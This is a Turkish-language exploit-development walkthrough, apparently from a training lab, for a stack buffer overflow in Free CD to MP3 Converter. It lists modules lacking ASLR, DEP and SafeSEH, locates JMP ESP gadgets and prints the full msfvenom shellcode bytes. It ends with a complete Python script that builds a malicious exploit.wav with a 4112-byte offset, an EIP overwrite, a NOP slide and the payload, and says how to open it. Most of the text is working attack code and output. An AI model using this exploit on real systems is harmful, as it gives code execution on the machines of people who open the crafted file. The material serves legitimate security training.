# Jumping to Shellcode

## Finding Return Instruction

### Locating Modules

Öncelikle attach edilmiş işlem tarafından yüklenen modülleri listele:

```pwsh
Command: ERC --ModuleInfo
```

```output title="Output" hl_lines="6 29 47"
------------------------------------------------------------------------------------------------------------------------
Process Name: cdextract Modules total: 61
------------------------------------------------------------------------------------------------------------------------
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path
------------------------------------------------------------------------------------------------------------------------
 0x400000        0xd88fc         0x11c000    False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\cdextract.exe
 0x77b90000      0x0             0x19d000    True       False      False      False      True       10.0.19041.1;ntdll.dll;C:\WINDOWS\SYSTEM32\ntdll.dll
 0x76720000      0x1cf90         0x9a000     True       False      False      False      True       10.0.19041.329;kernel32;C:\WINDOWS\System32\KERNEL32.DLL
 0x75fb0000      0xf45f0         0x211000    True       False      False      False      True       10.0.19041.388;Kernelbase.dll;C:\WINDOWS\System32\KERNELBASE.dll
 0x77700000      0xc450          0x179000    True       False      False      False      True       10.0.19041.1;user32;C:\WINDOWS\System32\user32.dll
 0x75ac0000      0x0             0x1d000     True       False      False      False      True       10.0.19041.630;Win32u;C:\WINDOWS\System32\win32u.dll
 0x76690000      0x5c90          0x22000     True       False      False      False      True       10.0.19041.546;gdi32;C:\WINDOWS\System32\GDI32.dll
 0x75ed0000      0x6a710         0xd9000     True       False      False      False      True       10.0.19041.572;gdi32;C:\WINDOWS\System32\gdi32full.dll
 0x75e50000      0x17800         0x7b000     True       False      False      False      True       10.0.19041.546;msvcp_win.dll;C:\WINDOWS\System32\msvcp_win.dll
 0x75be0000      0x2ba30         0x120000    True       False      False      False      True       10.0.19041.546;ucrtbase.dll;C:\WINDOWS\System32\ucrtbase.dll
 0x77880000      0x11d00         0x7a000     True       False      False      False      True       10.0.19041.1;advapi32.dll;C:\WINDOWS\System32\advapi32.dll
 0x77640000      0x35ac0         0xbf000     True       False      False      False      True       7.0.19041.546;msvcrt.dll;C:\WINDOWS\System32\msvcrt.dll
 0x77b10000      0x1ff50         0x75000     True       False      False      False      True       10.0.19041.1;sechost.dll;C:\WINDOWS\System32\sechost.dll
 0x77570000      0x4e2a0         0xc1000     True       False      False      False      True       10.0.19041.1;rpcrt4.dll;C:\WINDOWS\System32\RPCRT4.dll
 0x76dd0000      0x35670         0x96000     True       False      False      False      True       10.0.19041.546;OLEAUT32.DLL;C:\WINDOWS\System32\oleaut32.dll
 0x76400000      0x13be30        0x281000    True       False      False      False      True       10.0.19041.1;COMBASE.DLL;C:\WINDOWS\System32\combase.dll
 0x76310000      0x2c630         0xe3000     True       False      False      False      True       10.0.19041.1;OLE32.DLL;C:\WINDOWS\System32\ole32.dll
 0x76e70000      0x17be10        0x5b3000    True       False      False      False      True       10.0.19041.329;SHELL32;C:\WINDOWS\System32\shell32.dll
 0x76840000      0x42740         0xaf000     True       False      False      False      True       10.0.19041.1;comdlg32;C:\WINDOWS\System32\comdlg32.dll
 0x76220000      0x42480         0x87000     True       False      False      False      True       10.0.19041.1;SHCORE;C:\WINDOWS\System32\shcore.dll
 0x762c0000      0x17870         0x45000     True       False      False      False      True       10.0.19041.1;SHLWAPI;C:\WINDOWS\System32\SHLWAPI.dll
 0x70310000      0x1800          0x8000      True       False      False      False      True       10.0.19041.546;version;C:\WINDOWS\SYSTEM32\version.dll
 0x577b0000      0x67340         0x8d000     True       False      False      False      True       6.10;comctl32;C:\WINDOWS\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll
 0x672c0000      0x1000          0x13000     False      False      False      False      False      1.0rc1;AKRip32;C:\Program Files\CD to MP3 Freeware\akrip32.dll
 0x6d4b0000      0x55b0          0x28000     True       False      False      False      True       10.0.19041.1;winmm.dll;C:\WINDOWS\SYSTEM32\winmm.dll
 0x6cdc0000      0x1620          0x8000      True       False      False      False      True       10.0.19041.1;wsock32.dll;C:\WINDOWS\SYSTEM32\WSOCK32.DLL
 0x77900000      0x4b40          0x63000     True       False      False      False      True       10.0.19041.1;ws2_32.dll;C:\WINDOWS\System32\WS2_32.dll
 0x57d10000      0x4420          0x19000     True       False      False      False      True       10.0.19041.1;Microsoft ACM Audio Filter;C:\WINDOWS\SYSTEM32\msacm32.dll
 0x5da30000      0x13850         0x1d000     True       False      False      False      True       10.0.19041.1;winmmbase.dll;C:\WINDOWS\SYSTEM32\winmmbase.dll
 0x76da0000      0x21a0          0x26000     True       False      False      False      True       10.0.19041.546;imm32;C:\WINDOWS\System32\IMM32.DLL
 0x1b0000        0x5f68          0xd000      True       False      False      False      False      0.29.4.10;Frog ASPI;C:\Program Files\CD to MP3 Freeware\WNASPI32.DLL
 0x76960000      0x2efc0         0x434000    True       False      False      False      True       10.0.19041.1;SETUPAPI.DLL;C:\WINDOWS\System32\Setupapi.dll
 0x75db0000      0xd450          0x3b000     True       False      False      False      True       10.0.19041.546;cfgmgr32.dll;C:\WINDOWS\System32\cfgmgr32.dll
 0x75d00000      0x8ed0          0x1b000     True       False      False      False      True       10.0.19041.1;bcrypt.dll;C:\WINDOWS\System32\bcrypt.dll
 0x75900000      0x18f50         0x47000     True       False      False      False      True       10.0.19041.546;winsta;C:\WINDOWS\SYSTEM32\WINSTA.dll
 0x75820000      0x9990          0x24000     True       False      False      False      True       10.0.19041.546;devinfoset.dll;C:\WINDOWS\SYSTEM32\DEVOBJ.dll
 0x761d0000      0x15970         0x47000     True       False      False      False      True       10.0.19041.630;WINTRUST.DLL;C:\WINDOWS\System32\WINTRUST.dll
 0x75ae0000      0x554d0         0xff000     True       False      False      False      True       10.0.19041.1;CRYPT32.DLL;C:\WINDOWS\System32\CRYPT32.dll
 0x756e0000      0x5690          0xe000      True       False      False      False      True       10.0.19041.546;msasn1.dll;C:\WINDOWS\SYSTEM32\MSASN1.dll
 0x73cc0000      0x40f20         0x7d000     True       False      False      False      True       10.0.19041.1;UxTheme.dll;C:\WINDOWS\system32\uxtheme.dll
 0x77430000      0x4deb0         0xd3000     True       False      False      False      True       10.0.19041.1;MSCTF;C:\WINDOWS\System32\MSCTF.dll
 0x10000000      0xa3e0          0xc000      False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\ogg.dll
 0x1c40000       0xf4540         0xf6000     True       False      False      False      False      C:\Program Files\CD to MP3 Freeware\vorbis.dll
 0x650000        0x8c00          0xa000      True       False      False      False      False      C:\Program Files\CD to MP3 Freeware\vorbisfile.dll
 0x1d40000       0xdd6d0         0xdf000     True       False      False      False      False      C:\Program Files\CD to MP3 Freeware\vorbisenc.dll
 0x71360000      0x25a30         0x6a000     True       False      False      False      True       10.0.19041.1;MMDeviceAPI;C:\WINDOWS\SYSTEM32\MMDevAPI.DLL
 0x527a0000      0xcea0          0x3a000     True       False      False      False      True       10.0.19041.1;wdmaud.drv;C:\WINDOWS\SYSTEM32\wdmaud.drv
 0x740a0000      0x47e0          0xf000      True       False      False      False      True       10.0.19041.546;kernel.appcore.dll;C:\WINDOWS\SYSTEM32\kernel.appcore.dll
 0x5a980000      0x1ec0          0x7000      True       False      False      False      True       10.0.19041.1;ksuser.dll;C:\WINDOWS\SYSTEM32\ksuser.dll
 0x718b0000      0x1aa0          0x8000      True       False      False      False      True       10.0.19041.1;avrt.dll;C:\WINDOWS\SYSTEM32\AVRT.dll
 0x59a80000      0x35ce0         0x42000     True       False      False      False      True       10.0.19041.1;RdpAudioEndpoint;C:\WINDOWS\SYSTEM32\rdpendp.dll
 0x71c00000      0x2c70          0xf000      True       False      False      False      True       10.0.19041.546;wtsapi32.dll;C:\WINDOWS\SYSTEM32\WTSAPI32.dll
 0x711c0000      0x61b70         0xc3000     True       False      False      False      False      7.0.19041.1;propsys.dll;C:\WINDOWS\SYSTEM32\PROPSYS.dll
 0x75df0000      0x30900         0x5c000     True       False      False      False      True       10.0.19041.546;bcryptprimitives.dll;C:\WINDOWS\System32\bcryptPrimitives.dll
 0x6bb50000      0x85f80         0x212000    True       False      False      False      True       6.10;comctl32;C:\WINDOWS\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.DLL
 0x72460000      0x8f1a0         0x94000     True       False      False      False      False      C:\WINDOWS\SYSTEM32\TextShaping.dll
 0x69310000      0x3fe00         0xba000     True       False      False      False      True       10.0.19041.610;"TextInputFramework.DYNLINK";C:\WINDOWS\SYSTEM32\textinputframework.dll
 0x738c0000      0x37e70         0xb2000     True       False      False      False      True       10.0.19041.546;CoreMessaging.dll;C:\WINDOWS\System32\CoreMessaging.dll
 0x73630000      0x5e960         0x27e000    True       False      False      False      True       10.0.19041.546;CoreUIComponents.dll;C:\WINDOWS\System32\CoreUIComponents.dll
 0x74bc0000      0x7e90          0x29000     True       False      False      False      True       10.0.19041.1;ntmarta.dll;C:\WINDOWS\SYSTEM32\ntmarta.dll
 0x73090000      0x77610         0xde000     True       False      False      False      True       10.0.19041.1;Windows Base Types DLL;C:\WINDOWS\SYSTEM32\wintypes.dll
```

Sadece herhangi bir koruma etkin olmayan (False) modüller ele alınacak:

```output title="Output"
------------------------------------------------------------------------------------------------------------------------
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path
------------------------------------------------------------------------------------------------------------------------
 0x400000        0xd88fc         0x11c000    False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\cdextract.exe
 0x672c0000      0x1000          0x13000     False      False      False      False      False      1.0rc1;AKRip32;C:\Program Files\CD to MP3 Freeware\akrip32.dll
 0x10000000      0xa3e0          0xc000      False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\ogg.dll
```

### Searching JMP ESP Instructions

JMP ESP talimatını içeren adresleri aramak için aşağıda verilen yolu takip et:

* Symbols
* C:\Program Files\CD to MP3 Freeware\cdextract.exe
* Follow in Disassembler

Şimdi Find Command özelliğini kullanarak bir arama gerçekleştir:

```nasm title="Instruction"
jmp esp
```

| ADDRESS | DISASSEMBLY |
|---|---|
| 00419D0B | jmp esp |
| 00463B91 | jmp esp |
| 00477A8B | jmp esp |
| 0047E58B | jmp esp |
| 004979F4 | jmp esp |

### Searching Patterns

Alternatif olarak aşağıda verilen kod parçasını içeren adresler için de bir arama yapılabilir:

```nasm title="Assemble"
push esp;
ret;
```

Ancak bu durumda bu kodun makine kod eş değeri kullanılmalıdır:

```sh
my@attack:~$ /opt/metasploit/tools/exploit/nasm_shell.rb 32
nasm > push esp;
nasm > ret;
```

```nasm title="Output"
00000000  54                push esp
00000000  C3                ret
```

Şimdi Find Pattern özelliğini kullanarak bir arama gerçekleştir:

```hexdump title="Hex"
54 C3
```

| ADDRESS | DISASSEMBLY |
|---|---|
| 00457418 | push esp |
| 0047D4F5 | push esp |
| 0047D4FD | push esp |
| 00483D0E | push esp |

## Generating Shellcode

### Payload

```sh
my@attack:~$ msfvenom -p windows/exec CMD='cmd.exe' -f python --platform windows -a x86 -b "\x00"
```

```output title="Output"
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 219 (iteration=0)
x86/shikata_ga_nai chosen with final size 219
Payload size: 219 bytes
Final size of python file: 1096 bytes
buf =  b""
buf += b"\xdd\xc0\xd9\x74\x24\xf4\xbf\x69\x76\xa6\xf9\x5e"
buf += b"\x31\xc9\xb1\x31\x31\x7e\x17\x03\x7e\x17\x83\x87"
buf += b"\x8a\x44\x0c\xab\x9b\x0b\xef\x53\x5c\x6c\x79\xb6"
buf += b"\x6d\xac\x1d\xb3\xde\x1c\x55\x91\xd2\xd7\x3b\x01"
buf += b"\x60\x95\x93\x26\xc1\x10\xc2\x09\xd2\x09\x36\x08"
buf += b"\x50\x50\x6b\xea\x69\x9b\x7e\xeb\xae\xc6\x73\xb9"
buf += b"\x67\x8c\x26\x2d\x03\xd8\xfa\xc6\x5f\xcc\x7a\x3b"
buf += b"\x17\xef\xab\xea\x23\xb6\x6b\x0d\xe7\xc2\x25\x15"
buf += b"\xe4\xef\xfc\xae\xde\x84\xfe\x66\x2f\x64\xac\x47"
buf += b"\x9f\x97\xac\x80\x18\x48\xdb\xf8\x5a\xf5\xdc\x3f"
buf += b"\x20\x21\x68\xdb\x82\xa2\xca\x07\x32\x66\x8c\xcc"
buf += b"\x38\xc3\xda\x8a\x5c\xd2\x0f\xa1\x59\x5f\xae\x65"
buf += b"\xe8\x1b\x95\xa1\xb0\xf8\xb4\xf0\x1c\xae\xc9\xe2"
buf += b"\xfe\x0f\x6c\x69\x12\x5b\x1d\x30\x79\x9a\x93\x4f"
buf += b"\xcf\x9c\xab\x4f\x60\xf5\x9a\xc4\xef\x82\x22\x0f"
buf += b"\x54\x7c\x69\x0d\xfd\x15\x34\xc4\xbf\x7b\xc7\x33"
buf += b"\x83\x85\x44\xb1\x7c\x72\x54\xb0\x79\x3e\xd2\x29"
buf += b"\xf0\x2f\xb7\x4d\xa7\x50\x92\x2e\x2a\xcb\x33\xd5"
buf += b"\xcc\x76\x4c"
```

### Code

```python title="program.py" linenums="1" hl_lines="28-30"
import struct


def exploit():
    buf =  b""
    buf += b"\xdd\xc0\xd9\x74\x24\xf4\xbf\x69\x76\xa6\xf9\x5e"
    buf += b"\x31\xc9\xb1\x31\x31\x7e\x17\x03\x7e\x17\x83\x87"
    buf += b"\x8a\x44\x0c\xab\x9b\x0b\xef\x53\x5c\x6c\x79\xb6"
    buf += b"\x6d\xac\x1d\xb3\xde\x1c\x55\x91\xd2\xd7\x3b\x01"
    buf += b"\x60\x95\x93\x26\xc1\x10\xc2\x09\xd2\x09\x36\x08"
    buf += b"\x50\x50\x6b\xea\x69\x9b\x7e\xeb\xae\xc6\x73\xb9"
    buf += b"\x67\x8c\x26\x2d\x03\xd8\xfa\xc6\x5f\xcc\x7a\x3b"
    buf += b"\x17\xef\xab\xea\x23\xb6\x6b\x0d\xe7\xc2\x25\x15"
    buf += b"\xe4\xef\xfc\xae\xde\x84\xfe\x66\x2f\x64\xac\x47"
    buf += b"\x9f\x97\xac\x80\x18\x48\xdb\xf8\x5a\xf5\xdc\x3f"
    buf += b"\x20\x21\x68\xdb\x82\xa2\xca\x07\x32\x66\x8c\xcc"
    buf += b"\x38\xc3\xda\x8a\x5c\xd2\x0f\xa1\x59\x5f\xae\x65"
    buf += b"\xe8\x1b\x95\xa1\xb0\xf8\xb4\xf0\x1c\xae\xc9\xe2"
    buf += b"\xfe\x0f\x6c\x69\x12\x5b\x1d\x30\x79\x9a\x93\x4f"
    buf += b"\xcf\x9c\xab\x4f\x60\xf5\x9a\xc4\xef\x82\x22\x0f"
    buf += b"\x54\x7c\x69\x0d\xfd\x15\x34\xc4\xbf\x7b\xc7\x33"
    buf += b"\x83\x85\x44\xb1\x7c\x72\x54\xb0\x79\x3e\xd2\x29"
    buf += b"\xf0\x2f\xb7\x4d\xa7\x50\x92\x2e\x2a\xcb\x33\xd5"
    buf += b"\xcc\x76\x4c"

    offset = 4112

    buffer = b'A' * offset
    eip = struct.pack('<L', 0x00419D0B)
    nop = b'\x90' * 32

    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)


exploit()
```

### Understanding the Code

JMP ESP talimatını içeren bir adres (0x00419D0B) Little Endian formatına uygun hale getirilir:

!!! failure

    Adreste kötü karakter var ise saldırı başarısız olur.

```python title="program.py" linenums="29"
eip = pack('<L', 0x00419D0B)
```

Shellcode öncesine [NOP slide](https://en.wikipedia.org/wiki/NOP_slide) (0x90) adı verilen bir sekans yerleştirilir:

```python title="program.py" linenums="30"
nop = b'\x90' * 32
```

## Creating Sound File

```pwsh
PS C:\Users\htb-student> python .\program.py
```

## Exploit

Ses dosyasını Free CD to MP3 Converter üzerinde açmak için aşağıda verilen yolu takip et:

* Encode
* C:\Users\htb-student\exploit.wav
* Open
